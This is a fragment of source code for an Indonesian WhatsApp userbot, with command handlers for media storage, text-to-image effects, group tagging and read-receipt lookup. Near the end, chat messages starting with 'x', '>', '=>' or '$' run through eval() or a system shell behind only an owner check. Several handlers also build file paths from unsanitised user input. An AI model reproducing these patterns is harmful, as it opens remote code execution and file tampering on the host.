🔖 Prefix : ${nopref?'No prefix':multiprefix?'Multi prefix':prefix}
🔖 Runtime : ${kyun(process.uptime())}
🔖 Speed : ${processsTime(Ofc.messageTimestamp.low, moment())}s
🔖 Status : ${public_mode? `Public Mode`:`Self Mode`}
🔖 Total Hit : -
🔖 Personal Chat : ${totalchat.length - giid.length}
🔖 Group Chat : ${giid.length}
🔖 Total Chat : ${totalchat.length}
🔖 Total User : ${_user.length}
🔖 Total Block : ${blocked.length}
🔖 Total Baned : ${ban.length}

🏷️ Anti Call : ${setting.anti_call}
🏷️ Anti Delete : ${setting.anti_delete}
🏷️ Auto Register : ${autoregister}
🏷️ Auto Respond : ${autorespon? `False` : `True`}
🏷️ Multi Prefix : ${multiprefix}

「 *PHONE STATISTIC* 」
 
🔖 Whatsapp Ver. : ${wa_version}
🔖 Ram Usage : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
🔖 Mcc : ${mcc}
🔖 Mnc : ${mnc}
🔖 Versi OS : ${os_version}
🔖 Merk HP : ${device_manufacturer}
🔖 Versi HP : ${device_model}
🔖 Browser : ${Zeeone.browserDescription}
🔖 Baterai : ${isBattre} %
🔖 Charging : ${isCharge}
`
let qqppp = [{
                    "buttonId": `${prefix}owner`,
                    "buttonText": {
                        "displayText": "OWNER"
                    },
                    "type": "RESPONSE"
                },{
                    "buttonId": `${prefix}sewa`,
                    "buttonText": {
                        "displayText": "SEWA"
                    },
                    "type": "RESPONSE"
                }]
                sendButLocation(from, teks, `LordUserbot™© | Allright Reserved.`, thumbnail, qqppp, {contextInfo: { mentionedJid: [nupe]}})
				
} catch (e){
reply(`${e}`)
}
}
break
						case 'clearall':{
									if (!isOwner && !Ofc.key.fromMe) return
									let chiit = await Zeeone.chats.all()
									for (let i of chiit){
										Zeeone.modifyChat(i.jid, 'clear', {
											includeStarred: false
											})
											}
											reply(`Succes Lord`)
											}
									break
						case 'tes': case 'test': case 'ping':{
									reply(`${runtime2}`)
									}
									break
						case 'cekapikey':
									if (!isOwner && !Ofc.key.fromMe) return
									anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${lolkey}`)
									teks = `─「 *APIKEY CEK* 」─\n\n➸ *Username :* ${anu.result.username}\n➸ *REQUEST :* ${anu.result.requests}\n➸ *Today :* ${anu.result.today}\n➸ *Akun Type :* ${anu.result.account_type}\n➸ *Expired :* ${anu.result.expired}`
									Zeeone.sendMessage(`${ownerNumber}`, teks, text, {quoted: Ofc})
									break
						case 'nulis':
									reply(`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
									break
						case 'nuliskiri':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'22',
									'-interline-spacing',
									'2',
									'-annotate',
									'+140+153',
									fixHeight,
									'./media/nulis/images/buku/setelahkiri.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'nuliskanan':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'2',
									'-annotate',
									'+128+129',
									fixHeight,
									'./media/nulis/images/buku/setelahkanan.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokiri':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'1720x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'4',
									'-annotate',
									'+48+185',
									fixHeight,
									'./media/nulis/images/folio/setelahkiri.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokanan':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'3',
									'-annotate',
									'+89+190',
									fixHeight,
									'./media/nulis/images/folio/setelahkanan.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
									})
									}
									break
						case 'getpic': case 'getpp': case 'getprofile':{
									if (!isGroup) return reply(mess.only.group)
									reply(mess.wait)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) return
									mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
									try {
										pp = await Zeeone.getProfilePicture(mentioned)
										} catch {
											pp = `${imagebb}`
											}
											buffer = await getBuffer(pp)
											Zeeone.sendMessage(from, buffer, image, {quoted: Ofc, caption: `*Profile Picture Of @${mentioned.split("@")[0]}*`, thumbnail: thumbnail, contextInfo:{mentionedJid:[mentioned]}})
											}
									break
						case 'getnum': case 'getnomor': case 'getnumber':
									if (!isGroup) return reply(mess.only.group)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) return reply('Reply Pesan Target Lord')
									mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
									reply(`${mentioned.split('@')[0]}`)
									break
						case 'towame':
									if (Ofc.message.extendedTextMessage != undefined){
										mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
										reply(`wa.me/`+mentioned.split("@")[0])
										} else {
											reply(`${prefix+command} @tag atau reply`)
											}
											break
						case 'wame':
									wamo = q.replace(new RegExp("[()/ ]", "gi"), "+")
									reply(q?`wa.me/`+sender.split("@")[0]+'?text='+wamo: `wa.me/`+sender.split("@")[0])
									break
						case 'sendkontak': case 'kontak':
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (Ofc.message.extendedTextMessage != undefined){
										mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
										const ynkos = 'BEGIN:VCARD\n' 
										+ 'VERSION:3.0\n' 
										+ `FN:${q?q:`KONTAK`}\n`
										+ `ORG:KONTAK;\n`
										+ `TEL;type=CELL;type=VOICE;waid=${mentioned.split("@")[0]}:+${mentioned.split("@")[0]}\n`
										+ 'END:VCARD'
										Zeeone.sendMessage(from, {displayname: "Jeff", vcard: ynkos}, MessageType.contact, { quoted: Ofc})
										} else {
											const ynkos = 'BEGIN:VCARD\n' 
											+ 'VERSION:3.0\n' 
											+ `FN:${q.split('|')[1]}\n`
											+ `ORG:KONTAK;\n`
											+ `TEL;type=CELL;type=VOICE;waid=${q.split('|')[0]}:+${q.split('|')[0]}\n`
											+ 'END:VCARD'
											Zeeone.sendMessage(from, {displayname: "Jeff", vcard: ynkos}, MessageType.contact, { quoted: Ofc})
											}
									break 
						case 'notif':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									teks = `Notif Dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
									group = await Zeeone.groupMetadata(from);
									member = group['participants']
									jids = [];
									member.map(async adm => {
										jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
										})
										options = {
											text: teks,
											contextInfo: {
												mentionedJid: jids
												},
												quoted: Ofc
												}
												await Zeeone.sendMessage(from, options, text)
												limitAdd(sender, limit)
										break
						case 'addvn': case 'addaudio': case 'addmusic':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedAudio) return reply('Reply Audionya Lord')
									if (!q) return reply('Nama Audionya Apa Lord?')
									let addvn = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let delb = await Zeeone.downloadMediaMessage(addvn)
									audionye.push(q)
									fs.writeFileSync(`./database/audio/${q}.mp3`, delb)
									fs.writeFileSync('./database/audio.json', JSON.stringify(audionye))
									reply(`Sukses Menambahkan Audio!\nCek Audio Dengan Cara Ketik ${prefix}listvn`)
									break
						case 'delaudio': case 'delvn': case 'deletevn':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Audio Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/audio/${q}.mp3`)
										let delaudio = audionye.indexOf(q)
										audionye.splice(delaudio, 1)
										fs.writeFileSync('./database/audio.json', JSON.stringify(audionye))
										reply(`Succes Menghapus Audio ${q}!`)
										await sleep(5000)
										} catch (err) {
											console.log(err)
											reply(`Gagal Menghapus Audio ${q}!`)
										}
									break
						case 'listvn': case 'listaudio':
									Zeeone.updatePresence(from, Presence.avaible) 
									teks = '*「 LIST AUDIO 」*\n\n'
									for (let awokwkwk of audionye) {
										teks += `📊 ${awokwkwk}\n`
										}
										teks += `\n*TOTAL :* ${audionye.length}`
										reply(`${teks}`)
									break
						case 'addimage': case 'addfoto': case 'addphoto':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedImage) return reply('Reply Photonya Lord')
									if (!q) return reply('Nama Photonya Apa Lord?')
									let addimage = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let dellb = await Zeeone.downloadMediaMessage(addimage)
									imagenye.push(q)
									fs.writeFileSync(`./database/image/${q}.jpg`, dellb)
									fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
									reply(`Sukses Menambahkan Image!\nCek Image Dengan Cara Ketik ${prefix}listimage`)
									break
						case 'delimage': case 'deleteimage': case 'delfoto': case 'delphoto':
									if (!Ofc.key.fromMe && !isOwner  && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Sticker Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/image/${q}.webp`)
										let delimage = imagenye.indexOf(q)
										imagenye.splice(delimage, 1)
										fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
										reply(`Succes Menghapus Image ${q}!`)
										await sleep(5000)
										} catch (err) {
											reply(`Gagal Menghapus Image ${q}!`)
										}
									break
						case 'listimage': case 'listphoto': case 'listfoto': 
									let listimage = '*「 LIST STICKER 」*\n\n'
									for (let awokwkwk of imagenye) {
										listimage += `📊 ${awokwkwk}\n`
										}
										listimage += `\n*TOTAL :* ${imagenye.length}`
										reply(`${listimage}`)
									break
						case 'addvideo': case 'addvid':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedVideo) return reply('Reply Videonya Lord')
									if (!q) return reply('Nama Videonya Apa Lord?')
									let addvideo = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let dellbb = await Zeeone.downloadMediaMessage(addvideo)
									videonye.push(q)
									fs.writeFileSync(`./database/video/${q}.jpg`, dellbb)
									fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
									reply(`Sukses Menambahkan Video!\nCek Video Dengan Cara Ketik ${prefix}listvideo`)
									break
						case 'delvideo': case 'deletevideo':
									if (!Ofc.key.fromMe && !isOwner  && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Video Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/video/${q}.webp`)
										let delvideo = videonye.indexOf(q)
										videonye.splice(delvideo, 1)
										fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
										reply(`Succes Menghapus Video ${q}!`)
										await sleep(5000)
										} catch (err) {
											reply(`Gagal Menghapus Video ${q}!`)
										}
									break
						case 'listvideo': case 'listvid':  
									let listvideo = '*「 LIST VIDEO 」*\n\n'
									for (let awokwkwk of videonye) {
										listvideo += `📊 ${awokwkwk}\n`
										}
										listvideo += `\n*TOTAL :* ${videonye.length}`
										reply(`${listvideo}`)
									break
						case 'addstik': case 'addstiker': case 'addsticker':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedSticker) return reply('Reply stiker nya Lord')
									if (!q) return reply('Nama Sticker Nya Apa Lord?')
									let addstik = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let delbb = await Zeeone.downloadMediaMessage(addstik)
									setiker.push(q)
									fs.writeFileSync(`./database/stick/${q}.webp`, delbb)
									fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
									reply(`Sukses Menambahkan Sticker!!\nCek Sticker Dengan Cara Ketik ${prefix}liststick`)
									break
						case 'delstik': case 'delstick': case 'delsticker': case 'delstiker':
									if (!Ofc.key.fromMe && !isOwner  && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Sticker Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/stick/${q}.webp`)
										let delstik = setiker.indexOf(q)
										setiker.splice(delstik, 1)
										fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
										reply(`Succes Menghapus sticker ${q}!`)
										await sleep(5000)
										} catch (err) {
											reply(`Gagal Menghapus sticker ${q}!`)
										}
									break
						case 'liststik': case 'liststicker': case 'liststiker': case 'liststick':
									liststik = '*「 LIST STICKER 」*\n\n'
									for (let awokwkwk of setiker) {
										liststik += `📊 ${awokwkwk}\n`
										}
										liststik += `\n*TOTAL :* ${setiker.length}`
										reply(`${liststik}`)
									break
						case 'addrespon': case 'addres':
									if (!isPremium && !isOwner && !Ofc.key.fromMe) return reply(mess.only.prem)
									 if (args.length < 1) return reply(`Kirim perintah ${command} command|jawaban`)
									var soal = q.split('|')[0]
									var jawaban = q.split('|')[1]
									if (!jawaban) return reply(`Jawabannya apa?`)
									if (checkCommands(soal.toLowerCase(), cmdDB)) return reply(`Command tersebut sudah ada!`)
									addCommands(soal.toLowerCase(), jawaban, sender, cmdDB)
									reply('Sukses!')
									break
						case 'deleterespon': case 'dellrespon': case 'delrespon': 
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (args.length < 1) return reply(`Kirim perintah ${command} list respon`)
									if (isCreated(q.toLowerCase(), sender, cmdDB) && !isOwner) return reply(`Anda bukan pembuat command!`)
									deleteCommands(q.toLowerCase(), cmdDB)
									reply('Sukses Lord')
									break
						case 'listrespon': case 'listres':
									if (!isOwner && !Ofc.key.fromMe) return
									var txtt = `LIST REPONSE\nJumlah : *${cmdDB.length}*\n\n`
									for (let i of cmdDB){
										txtt += `*Respon :* ${i.commands}\n*Jawaban :* ${i.jawaban}\n*Created :* @${i.created.split("@")[0]}\n\n`
										}
										Zeeone.sendMessage(`${ownerNumber}`, txtt, text, { quoted: Ofc, contextInfo:{ mentionedJid: parseMention(txtt) }})
										break
						case 'chatinfo': case 'sider':{
									if (!isGroup) return reply(mess.only.group)
									infom = await Zeeone.messageInfo(from, Ofc.message.extendedTextMessage.contextInfo.stanzaId)
									hemm = infom.reads
									hemms = infom.deliveries
									readon = hemms.map(v => v.jid)
									readdin = hemm.map(v => v.jid)
									stamp = hemm.map(v => v.t)
									function toTime(UNIXtimestamp, ribuan) {
										ribuan = (typeof ribuan == 'undefined') ? false : true;
										let a = new Date(UNIXtimestamp);
										if (ribuan) {
											a = new Date(UNIXtimestamp * 1000);
											}
											var hour = a.getHours();
											var min = a.getMinutes();
											var sec = a.getSeconds();
											var time = `${hour}:${min}:${sec}`;
											return time;
										}

										function toBulan(UNIXtimestamp, ribuan) {
											ribuan = (typeof ribuan == 'undefined') ? false : true;
											let a = new Date(UNIXtimestamp);
											if (ribuan) {
												a = new Date(UNIXtimestamp * 1000);
												}
												var months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember'];
												var myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum at', 'Sabtu'];
												var day = a.getDate()
												bulanee = a.getMonth()
												var thisDay = a.getDay(),
												thisDay = myDays[thisDay];
												var yy = a.getYear()
												var year = (yy < 1000) ? yy + 1900 : yy;
												var bul = `${thisDay}, ${day} - ${months[bulanee]} - ${year}`;
												return bul;
												}
												teksx = `「 *TELAH DIBACA* 」\n\n`
												for (let i of hemm) {
													teksx += `📛 Nama : @${i.jid.split('@')[0]}\n⏰ Waktu : ${toTime(i.t, true)}\n📅 Tanggal : ${toBulan(i.t, true)}\n\n`
													}
												teksx1 = `「 *BELUM DIBACA* 」\n\n`
												for (let i of hemms) {
													teksx1 += `📛 Nama : @${i.jid.split('@')[0]}\n`
													teksx1 += `⏰ Waktu : ${toTime(i.t, true)}\n📅 Tanggal : ${toBulan(i.t, true)}\n\n`
													}
												Zeeone.sendMessage(from, teksx, text, { sendEphemeral: false, quoted: Ofc, thumbnail: thumbnail, contextInfo: { forwardingScore: 999, isForwarded: false, mentionedJid: readdin } })
												Zeeone.sendMessage(from, teksx1, text, { sendEphemeral: false, quoted: Ofc, thumbnail: thumbnail, contextInfo: { forwardingScore: 999, isForwarded: false, mentionedJid: readon } })
												}
												break
						case 'jadian':
									if (!isGroup) return reply(mess.only.group)
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									jds = []
									const A11 = groupMembers
									const B11 = groupMembers
									const C11 = A11[Math.floor(Math.random() * A11.length)] 
									const C22 = B11[Math.floor(Math.random() * B11.length)]
									D11 = `*「 JADIAN 」*\n\n@${C11.jid.split('@')[0]} ❤ @${C22.jid.split('@')[0]}\n\nMogaa Langgeng 😘`  
									jds.push(C11.jid)
									jds.push(C22.jid)
									mentions(D11, jds, true)
									await limitAdd(sender, limit)
									break
						case 'naruto':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pNaruto(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url, q)
										})
									break
						case 'shadow':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pShadow(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'romantic':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pRomantic(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'smoke':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pSmoke(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'burnpaper':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pBurnPapper(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'lovemsg':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pLoveMsg(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'grass':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pMsgGrass(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'doubleheart':
									if (!q) return reply('teksnya Lord?')
									reply(mess.wait)
									pDoubleHeart(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'coffecup':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pCoffeCup(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'lovetext':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pLoveText(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'butterfly':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pButterfly(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'styletext': case 'textstyle':
									reply(Object.entries(await styleText(q)).map(([name, value]) => `_${name}_ : ${value}`).join`\n\n`)
									break
						case 'inspect':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										let linkRegex = /chat\.whatsapp\.com\/(?:invite\/)?([0-9A-Za-z]{20,24})/i
										let [, code] = q.match(linkRegex) || []
										if (!code) throw 'Link invalid'
										res = await Zeeone.query({json: ["query", "invite", code],
										expect200: true})
										caption = `「 *GROUP LINK INSPECTOR* 」 
										
🔖 Nama Grup : ${res.subject}
🔖 Terakhir di ubah oleh : @${res.subjectOwner.replace("@c.us","")}
🔖 Di Ubah Pada ${formatDate(res.subjectTime * 1000)}

🔖 ID : ${res.id}
🔖 Di Buat Oleh : @${res.id.split('-')[0]}
🔖 Di Buat pada ${formatDate(res.creation * 1000)}

🔖Edit info grup : ${res.restrict?`Hanya admin`:`Semua peserta`}
🔖Kirim pesan : ${res.announce?`Hanya admin`:`Semua peserta`}
🔖Pesan sementara : ${res.ephemeralDuration?`Aktif`:`mati`}
🔖Jumlah Member : ${res.size}
🔖Member Yang Diketahui : ${res.participants ? '\n│ *' + res.participants.map((user, i) => ++i + '. @' + user.id.split`@`[0]+'*').join('\n│ *').trim() : 'Gada'}
🔖Deskripsi :*
${res.desc ? `${res.desc}` : 'Gada'}
🔖Terakhir di ubah oleh : @${res.descOwner.replace("@c.us","")}*
🔖Di ubah pada ${formatDate(res.descTime * 1000)}`
									try {
										profilePic = await Zeeone.getProfilePicture(res.id)
										} catch {
											profilePic = `${imagebb}`
											}
											anay = await getBuffer(profilePic)
											Zeeone.sendMessage(from, anay, image, {quoted: Ofc, thumbnail: thumbnail, caption: caption, contextInfo: {
												mentionedJid: Zeeone.parseMention(caption)
												}})
												} catch (e) {
													reply(`${e}`)
													}
												limitAdd(sender, limit)
												break
												default:
		if(budy.includes("@verif", "@verify","daftar")){
			if (isUser) return reply('Kamu sudah terdaftar di dalam database')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
fs.writeFileSync('./database/user.json', JSON.stringify(_user))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`, thumbnail, papako, {contextInfo: { mentionedJid: [sender]}})
                }
		
if (budy.startsWith('x')){
try {
if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
return Zeeone.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: Ofc})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('>')){
try {
	if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
return Zeeone.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: Ofc})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('$')){
if (!Ofc.key.fromMe && !isOwner && !isCreator ) return reply(mess.only.owner)
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`LordUserbot :~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('=>')){
if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color("=>", "green"), 'from', color(pushname), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[ PRIVATE ]', 'aqua'), wib, color(pushname))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}
